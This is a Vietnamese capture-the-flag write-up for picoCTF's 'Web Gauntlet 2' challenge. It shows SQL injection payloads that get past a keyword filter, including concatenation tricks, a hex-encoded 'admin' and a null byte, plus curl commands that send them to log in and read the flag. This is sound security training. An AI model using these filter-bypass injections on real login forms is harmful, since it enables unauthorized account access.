# Web Gauntlet 2

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image371.png?raw=true)

Truy cập trang web:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image372.png?raw=true)

Xem nội dung `filter.php`:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image373.png?raw=true)

=> Có thể thấy ta cần bypass trang login bằng SQLi mà không được dùng `OR, AND, TRUE/FALSE, UNION, LIKE, =, >, <, ;, --, /* */, admin`

Khi dùng payload `test' || 1#` thì trang web trả về:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image375.png?raw=true)

=> Câu truy vấn sẽ có dạng `SELECT username, password FROM users WHERE username='test' || 1# ' AND password='abc'`

Nếu dùng payload `x' || username IN (0x61646d696e) #` thì trang web trả về:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image374.png?raw=true)

Tôi thử sử dụng payload giống trong thử thách `Web Gauntlet 1` là `ad'||'min'%00`, null byte sẽ không thể sử dụng trực tiếp trên web nên tôi dùng `cURL`, câu lệnh sẽ là:

    curl --data "user=ad'||'min'%00&pass=a" http://mercury.picoctf.net:61434/index.php --cookie "PHPSESSID=9h8jii0i5qiohfk3eidora23ms" --output -

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image376.png?raw=true)

=> Thành công, kiểm tra file `filter.php` bằng lệnh:

    curl http://mercury.picoctf.net:61434/filter.php --cookie "PHPSESSID=9h8jii0i5qiohfk3eidora23ms" | grep picoCTF

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image377.png?raw=true)
